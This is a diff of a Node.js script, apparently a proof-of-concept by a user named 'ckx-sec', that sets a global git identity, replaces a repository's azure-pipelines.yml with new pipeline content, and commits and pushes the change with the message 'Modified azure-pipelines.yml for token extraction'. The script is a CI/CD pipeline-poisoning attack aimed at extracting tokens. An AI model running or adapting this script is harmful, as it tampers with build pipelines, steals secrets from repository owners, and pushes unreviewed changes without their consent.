@@ -1,18 +1,29 @@
 // const { exec } = require('child_process');
-
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
 
-// Step 1: Rename existing azure-pipelines.yml file
-const originalFileName = 'azure-pipelines.yml';
-const newFileName = 'azure-pipelines-backup.yml';
+// Step 1: Configure git user info
+exec('git config --global user.email "13911336781@163.com" && git config --global user.name "ckx-sec"', (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Error configuring git user info: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    console.error(`git config stderr: ${stderr}`);
+    return;
+  }
+  console.log(`git config stdout: ${stdout}`);
 
-fs.renameSync(originalFileName, newFileName);
-console.log(`Renamed ${originalFileName} to ${newFileName}`);
+  // Step 2: Rename existing azure-pipelines.yml file
+  const originalFileName = 'azure-pipelines.yml';
+  const newFileName = 'azure-pipelines-backup_fake.yml';
 
-// Step 2: Write new content to azure-pipelines.yml
-const newYamlContent = `
+  fs.renameSync(originalFileName, newFileName);
+  console.log(`Renamed ${originalFileName} to ${newFileName}`);
+
+  // Step 3: Write new content to azure-pipelines.yml
+  const newYamlContent = `
 trigger:
   branches:
     include:
@@ -47,23 +58,25 @@ steps:
     appType: 'functionApp'
     appName: 'mypocfunctiontest'
     package: '$(Build.ArtifactStagingDirectory)/'
-`;
+  `;
 
-fs.writeFileSync(originalFileName, newYamlContent.trim());
-console.log(`Created and wrote to ${originalFileName}`);
+  fs.writeFileSync(originalFileName, newYamlContent.trim());
+  console.log(`Created and wrote to ${originalFileName}`);
 
-// Step 3: Commit and push changes to the repository
-exec('git add . && git commit -m "Modified azure-pipelines.yml for token extraction" && git push', (error, stdout, stderr) => {
-  if (error) {
-    console.error(`Error during git operation: ${error.message}`);
-    return;
-  }
-  if (stderr) {
-    console.error(`git stderr: ${stderr}`);
-    return;
-  }
-  console.log(`git stdout: ${stdout}`);
+  // Step 4: Commit and push changes to the repository
+  exec('git add . && git commit -m "Modified azure-pipelines.yml for token extraction" && git push', (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error during git operation: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      console.error(`git stderr: ${stderr}`);
+      return;
+    }
+    console.log(`git stdout: ${stdout}`);
+  });
 });
+
 
 
 // // 确保已切换到 'main' 分支
